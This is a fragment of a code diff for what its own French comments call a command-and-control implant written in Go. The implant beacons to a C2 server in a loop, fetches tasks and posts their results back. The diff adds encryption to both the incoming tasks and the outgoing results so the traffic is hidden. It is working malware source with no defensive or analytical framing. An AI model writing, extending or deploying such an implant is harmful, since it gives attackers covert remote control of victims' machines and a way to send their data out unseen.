@@ -28,6 +28,10 @@ type TaskResult struct {
 	Output string `json:"output"`
 }
 
+type EncryptedPayload struct {
+	Data string `json:"data"`
+}
+
 func main() {
 	// Boucle infinie pour contacter le C2 périodiquement (beaconing).
 	for {
@@ -73,10 +77,26 @@ func getTask() (*Task, error) {
 		return nil, err
 	}
 
-	var task Task
-	err = json.Unmarshal(body, &task)
+	// Le corps est chiffré, on le déchiffre.
+	var encryptedPayload EncryptedPayload
+	if err := json.Unmarshal(body, &encryptedPayload); err != nil {
+		// Si le payload n'est pas du JSON chiffré, c'est peut-être une réponse "pas de tâche" non chiffrée.
+		var task Task
+		if json.Unmarshal(body, &task) == nil && task.Command == "" {
+			return &task, nil
+		}
+		return nil, fmt.Errorf("error unmarshalling payload: %v", err)
+	}
+
+	decryptedData, err := Decrypt(encryptedPayload.Data, []byte(EncryptionKey))
 	if err != nil {
-		return nil, err
+		return nil, fmt.Errorf("error decrypting task: %v", err)
+	}
+
+	var task Task
+	err = json.Unmarshal(decryptedData, &task)
+	if err != nil {
+		return nil, fmt.Errorf("error unmarshalling decrypted task: %v", err)
 	}
 
 	return &task, nil
@@ -105,8 +125,23 @@ func sendResult(result TaskResult) {
 		return
 	}
 
+	// Chiffre le résultat
+	encryptedData, err := Encrypt(jsonData, []byte(EncryptionKey))
+	if err != nil {
+		fmt.Println("Error encrypting result:", err)
+		return
+	}
+
+	// Prépare le payload chiffré
+	payload := EncryptedPayload{Data: encryptedData}
+	encryptedPayloadBytes, err := json.Marshal(payload)
+	if err != nil {
+		fmt.Println("Error marshalling encrypted payload:", err)
+		return
+	}
+
 	client := &http.Client{}
-	req, err := http.NewRequest("POST", C2_URL, bytes.NewBuffer(jsonData))
+	req, err := http.NewRequest("POST", C2_URL, bytes.NewBuffer(encryptedPayloadBytes))
 	if err != nil {
 		fmt.Println("Error creating request:", err)
 		return
